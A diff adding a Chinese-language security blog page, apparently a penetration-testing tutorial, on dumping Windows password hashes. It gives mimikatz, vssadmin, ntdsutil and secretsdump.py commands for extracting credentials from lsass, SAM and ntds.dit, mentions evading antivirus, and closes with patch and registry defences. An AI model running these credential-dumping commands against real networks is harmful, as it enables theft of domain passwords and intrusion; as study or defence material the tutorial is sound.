@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  Hash抓取 —— 域与工作组、在线与离线 &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="Hash抓取手法、重点是域网络下的离线抓取。什么是Hash？
+|blog under go1f.cc">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="Hash抓取 —— 域与工作组、在线与离线 | 春田花花幼稚园">
+    <meta name="twitter:description" content="Hash抓取手法、重点是域网络下的离线抓取。什么是Hash？|blog under go1f.cc">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>主页</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>博客</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">Hash抓取 —— 域与工作组、在线与离线</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+<a href='/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F' class="muted-link">
+  <span class="Label Label--gray-darker">内网渗透</span>
+</a>
+
+
+
+<a href='/tags/hash' class="muted-link">
+  <span class="Label Label--gray">Hash</span>
+</a>
+
+<a href='/tags/%E5%9F%9F%E6%B8%97%E9%80%8F' class="muted-link">
+  <span class="Label Label--gray">域渗透</span>
+</a>
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-02-27. Published at: 2020-02-11.">
+        
+          Lastmod: 2020-02-27
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>Hash抓取手法、重点是域网络下的离线抓取。什么是Hash？</p>
+<p>​</p>
+<h2 id="hash来源">Hash来源</h2>
+<ul>
+<li>
+<p>lsass.exe 进程，内存抓取已登录活动用户的 Hash</p>
+</li>
+<li>
+<p>SAM(加密hash)+SYSTEM文件(密钥)，适用普通域用户或普通工作组用户</p>
+<p>SAM： <code>C:\Windows\system32\config\SAM</code></p>
+<p>SYSTEM：<code>C:\Windows\system32\config\SYSTEM</code></p>
+</li>
+<li>
+<p>ntds.dit，域控存放所有域用户的账号/密码(hash)</p>
+</li>
+</ul>
+<h2 id="在线抓取">在线抓取</h2>
+<p>权限需要时本地管理员或域管理员</p>
+<p><strong>mimikatz</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">privilege::debug     #Win2008后进行权限提升，绕过UAC限制
+sekurlsa::logonpasswords
+</code></pre></div><p><img src="https://i.loli.net/2020/02/14/cWSlVapo6w4dEuF.jpg" alt="sekurlsa_logonpasswords.jpg"></p>
+<p>​</p>
+<p><strong>Pwdump7</strong></p>
+<ul>
+<li>需要免杀</li>
+<li>用户名称：SID：LM-HASH值：NT-HASH值</li>
+</ul>
+<p>​</p>
+<p><strong>WCE</strong></p>
+<ul>
+<li>需要免杀</li>
+<li>抓取明文：<code>wce.exe -w</code></li>
+<li>支持 win8及之前</li>
+</ul>
+<p>​</p>
+<p><strong>QuarksPwDump</strong></p>
+<ul>
+<li>
+<p>-dhl &ndash;dump-hash-local    获取已登录用户hash</p>
+</li>
+<li>
+<p>-dhdc &ndash;dump-hash-domain-cached   获取已登录的域用户hash</p>
+</li>
+</ul>
+<p>​</p>
+<p><strong>gethashes</strong></p>
+<p>​</p>
+<h2 id="离线抓取">离线抓取</h2>
+<p>域环境中，尽量<strong>不要直接在线获取</strong>hash，特别是域环境比较大的时候，在线获取hash等待时间较长，工具占用太多，容易造成域控服务器崩溃</p>
+<p>​</p>
+<p><strong>关键文件</strong></p>
+<p>SYSTEM文件 +  ntds.dit（域控机）或 SAM（普通域、工作组主机）</p>
+<blockquote>
+<p>ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM组测表配置单元中的密钥对这些哈希值进行加密。</p>
+</blockquote>
+<p>​</p>
+<p><strong>SYSTEM</strong>文件存放在<code>C:\Windows\system32\config\system</code>，亦可注册表导出。</p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">reg save hklm\system C:\hash\system.hive
+</code></pre></div><p>​</p>
+<p>对加载中的文件SAM、 ntds.dit使用微软的卷影拷贝技术，实现文件导出。</p>
+<h3 id="vssadmin">vssadmin</h3>
+<p>适用于WinServer2003、2008、2012与Win8系统。</p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">#拷贝C盘
+vssadmin create shadow /for=C:
+# #获取卷名 拷贝ntds.dit和SYSTEM
+<span class="k">copy</span> \\?\GLOBALROOT\Device\HarddiscdkVolumeShadowCopy2\wind
+ows\ntds\ntds.dit C:\hash
+<span class="k">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\wind
+ows\system32\config\SYSTEM C:\hash
+</code></pre></div><p><img src="https://i.loli.net/2020/02/14/uUcNV5HzPoOLi4y.jpg" alt="system_ntds.dit_copy.jpg"></p>
+<p>​</p>
+<h3 id="ntdsutilexe">ntdsutil.exe</h3>
+<p>Ntdsutil.exe是AD提供管理设施的命令行工具</p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">#进入命令行
+ntdsutil.exe
+#ntdsutil:
+snapshot
+activate instance ntds
+create  #创建快照
+mount {195f814f-9a8d-42df-b7a5-f8495b6ec352}   #挂载快照
+
+#删除快照 delete {195f814f-9a8d-42df-b7a5-f8495b6ec352}
+</code></pre></div><p><img src="https://i.loli.net/2020/02/14/zXR8YwIJLm9b5HN.jpg" alt="ntdsutil.exe_snapshot_ntds.jpg"></p>
+<p>拷贝ntds.dit与SYSTEM</p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">cd</span> C:\$SNAP_202002141130_VOLUMEC$\
+<span class="k">copy</span> windows\NTDS\ntds.dit \\pc1\c$\hash
+<span class="k">copy</span> windows\system32\config\SYSTEM \\pc1\c$\hash
+</code></pre></div><p><img src="https://i.loli.net/2020/02/14/QLkUZtYp2qbW754.jpg" alt="copy_from_ntdsutil_method.jpg"></p>
+<p>​</p>
+<h3 id="others">others</h3>
+<ul>
+<li>
+<p>diskshadow.exe   官方，适用Windows Server 2016, Windows Server 2012 R2, Windows Server 2012</p>
+</li>
+<li>
+<p>vshadow.exe  官方SDK工具</p>
+</li>
+<li>
+<p>vssdown</p>
+</li>
+<li>
+<p>auxiliary/admin/smb/psexec_ntdsgrab</p>
+</li>
+<li>
+<p>PowerSploit的lnvoke-NinjaCopy远程提取ntds.dit</p>
+</li>
+</ul>
+<p><strong>扩展阅读</strong></p>
+<p><a href="https://www.anquanke.com/post/id/103117">DiskShadow工具介绍：VSS绕过、持久化感染和活动目录数据库提取</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-6617.html">导出当前域内所有用户hash的技术整理</a></p>
+<p>​</p>
+<h2 id="解码">解码</h2>
+<p><strong>secretsdump.py</strong>（ impacket工具包）</p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">python secretsdump.py -system C:\hash\SYSTEM -ntds C:\hash\ntds.dit local
+</code></pre></div><p><img src="https://i.loli.net/2020/02/14/VYb51rt7TABcwjU.jpg" alt="secretsdump_py.jpg"></p>
+<p>​</p>
+<p><strong>QuarksPwDump-off-line.exe</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">QuarksPwDump-off-line.exe -dhd -sf SYSTEM -nt ntds.dit -o hash.txt
+</code></pre></div><p>​</p>
+<p><strong>SAMInside</strong> (GUI界面)</p>
+<ul>
+<li>配合复制的system、sam文件解密</li>
+</ul>
+<p>​</p>
+<p><strong>彩虹表爆破</strong></p>
+<ul>
+<li>
+<p>在线解密  <a href="https://objectif-securite.ch/ophcrack">objectif-securite.ch/ophcrack</a></p>
+</li>
+<li>
+<p>John the ripper     <code>john --format=nt hash.txt</code></p>
+</li>
+</ul>
+<p>​</p>
+<h2 id="明文密码">明文密码</h2>
+<p><strong>原理</strong></p>
+<p>获取内存文件lsass.exe进程（用于本地安全和登录策略）中存储的明文登录密码。</p>
+<p>Wdigest SSP 在内存中以加密的形式保存了用户的明文，这个协议目前主要只用于 IIS 与 LDAP(轻量级目录访问协议)。</p>
+<p><strong>常用工具</strong></p>
+<ul>
+<li>
+<p>getpass</p>
+</li>
+<li>
+<p>Mimikatz</p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+</code></pre></div></li>
+<li>
+<p>WCE <code>wce -w</code></p>
+</li>
+</ul>
+<p>​</p>
+<p><strong>相关补丁</strong></p>
+<p>KB2871997：删除除了wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用。禁用Widgest Auth，内存(lsass进程)不在保存明文口令。但该选项仍然可以手动开启。</p>
+<p>Win10或2012R2后，默认禁止内存缓存保存明文。</p>
+<p>​</p>
+<p><strong>防御</strong></p>
+<ul>
+<li>
+<p>打 KB2871997 补丁</p>
+</li>
+<li>
+<p>升级系统 WindowsServer 2012R2</p>
+</li>
+<li>
+<p>注册表 UseLogonCredential 项修改为0</p>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
+</code></pre></div></li>
+</ul>
+<p>​</p>
+<h2 id="常见加密">常见加密</h2>
+<p>HASH算法思想：任意长度的输入变换为固定长度的输出。</p>
+<p><strong>Windows NTLM 挑战认证</strong></p>
+<p>LM-HASH（WIN2003前）</p>
+<ul>
+<li>可以判断原始明文口令是否小于8字节</li>
+<li>魔术字符 &ldquo;KGS!@#$%&rdquo;</li>
+</ul>
+<p>NTLM-HASH</p>
+<ul>
+<li>大小写敏感</li>
+</ul>
+<p>​</p>
+<p><strong>常见的CMS加密</strong></p>
+<ul>
+<li>DeDeCMS：裁切32位MD5， <code>$pwd = substr($password, 5, 20);</code></li>
+<li>WordPress：随机生成的盐与密码相加，进行count次md5，与encode64的hash数值累加，得到P开头密码</li>
+<li>Discuss、Vbulletin、IceBB：<code>MD5(MD5($password).$salt);</code></li>
+<li>Joomla：<code>MD5($pass.$salt);</code></li>
+</ul>
+<p>​</p>
+<p><strong>数据库加密</strong></p>
+<p>MySQL 4.1版本之前，MySQL323加密，<code>select old_password('123');</code></p>
+<p>之后是MysqlSHA1加密，<code>select password('123')</code> 或 <code>SHA-1(SHA-1('123'))</code></p>
+<p>​</p>
+<h2 id="参考阅读">参考阅读</h2>
+<p><a href="https://www.secpulse.com/archives/65256.html">几种windows本地hash值获取和破解详解</a></p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>Hash抓取 —— 域与工作组、在线与离线</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#hash来源">Hash来源</a></li>
+    <li><a href="#在线抓取">在线抓取</a></li>
+    <li><a href="#离线抓取">离线抓取</a>
+      <ul>
+        <li><a href="#vssadmin">vssadmin</a></li>
+        <li><a href="#ntdsutilexe">ntdsutil.exe</a></li>
+        <li><a href="#others">others</a></li>
+      </ul>
+    </li>
+    <li><a href="#解码">解码</a></li>
+    <li><a href="#明文密码">明文密码</a></li>
+    <li><a href="#常见加密">常见加密</a></li>
+    <li><a href="#参考阅读">参考阅读</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
